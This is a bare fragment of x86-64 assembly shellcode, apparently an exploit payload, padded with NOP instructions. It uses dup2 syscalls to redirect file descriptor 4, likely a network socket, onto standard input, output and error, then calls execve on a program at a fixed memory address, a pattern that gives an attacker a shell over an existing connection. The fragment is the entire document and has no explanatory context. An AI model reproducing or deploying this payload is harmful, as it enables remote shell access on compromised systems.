nop
nop
nop
mov rax, 33
mov rdi, 4
xor rsi, rsi
syscall
mov rax, 33
inc rsi
syscall
mov rax, 33
inc rsi
syscall
mov rax, 59
xor rdx, rdx
mov rsi, rdx
mov rdi, 0x601000
syscall
nop
nop
nop

